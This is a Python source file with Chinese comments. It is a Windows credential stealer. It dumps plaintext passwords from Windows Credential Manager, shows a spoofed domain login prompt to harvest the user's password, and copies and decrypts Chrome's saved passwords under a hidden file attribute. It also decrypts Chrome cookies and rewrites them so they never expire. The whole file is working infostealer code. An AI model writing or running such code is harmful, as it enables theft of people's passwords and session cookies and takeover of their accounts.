import os
import io
import sqlite3
import shutil
import win32cred
import win32crypt
import win32api
import win32con
import pywintypes

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC

def dump_credsman_generic():
    CredEnumerate = win32cred.CredEnumerate
    CredRead = win32cred.CredRead

    try:
        creds = CredEnumerate(None, 0)  # 枚举凭证
    except Exception:  # 避免在任何异常情况下崩溃
        pass

    credentials = []

    for package in creds:
        try:
            target = package['TargetName']
            creds = CredRead(target, CRED_TYPE_GENERIC)
            credentials.append(creds)
        except pywintypes.error:
            pass
        credman_creds = io.StringIO()  # 内存中文本流

        for cred in credentials:
            service = cred['TargetName']
            username = cred['UserName']
            password = cred['CredentialBlob'].decode('utf-8','ignore')

            credman_creds.write('Service: ' + str(service) + '\n')
            credman_creds.write('Username: ' + str(username) + '\n')
            credman_creds.write('Password: ' + str(password) + '\n')
            credman_creds.write('\n')

        return credman_creds.getvalue()

def ask_domain_credentials():
    CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials

    creds = []

    try:
        creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
    except Exception:
        pass
    return creds

def dump_chrome_passwords():
    try:
        login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
        shutil.copy2(login_data, './Login Data')  # 复制数据库到当前目录
        win32api.SetFileAttributes('./Login Data',win32con.FILE_ATTRIBUTE_HIDDEN)  # 在文件操作过程中不可见
    except Exception:
        pass

    chrome_credentials = io.StringIO()
    try:
        conn = sqlite3.connect('./Login Data', )                                        # 连接数据库
        cursor = conn.cursor()                                                          # 创建一个游标来获取数据
        cursor.execute('SELECT action_url, username_value, password_value FROM logins') # 查询
        results = cursor.fetchall()                                                     # 获取数据
        conn.close()                                                                    # 关闭数据库文件，使其不会被进程锁定
        os.remove('Login Data')                                                         #完成后删除文件

        for action_url, username_value, password_value in results:
            password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1] # 使用CryptUnprotectData解密
            if password:                                                                		 # 将凭据写进内存中的文本流
                chrome_credentials.write('URL: ' + action_url + '\n')
                chrome_credentials.write('Username: ' + username_value + '\n')
                chrome_credentials.write('Password: ' + str(password) + '\n')
                chrome_credentials.write('\n')
        return chrome_credentials.getvalue()                                            		 # 返回内存中的文本流

    except sqlite3.OperationalError as e:
        print(e)
        pass

    except Exception as e:
        print(e)
        pass

def get_chrome_cookie():
    login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Cookies'  # cookies文件路径
    shutil.copy2(login_data, './Cookies')  # 复制到当前路径
    win32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)
    try:
        conn = sqlite3.connect('./Cookies')  # 连接
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')  # 查询
        results = cursor.fetchall()  # 获取

        # 解密
        for host_key, name, value, encrypted_value in results:
            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()

            # 使用解密的值更新文件
            cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",(decrypted_value, host_key, name));

        conn.commit()  # 保存改变
        conn.close()  # 关闭文件，使其不被进程锁定

    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    # print(dump_chrome_passwords())
    # print(ask_domain_credentials())
    # print(dump_credsman_generic())
    # get_chrome_cookie()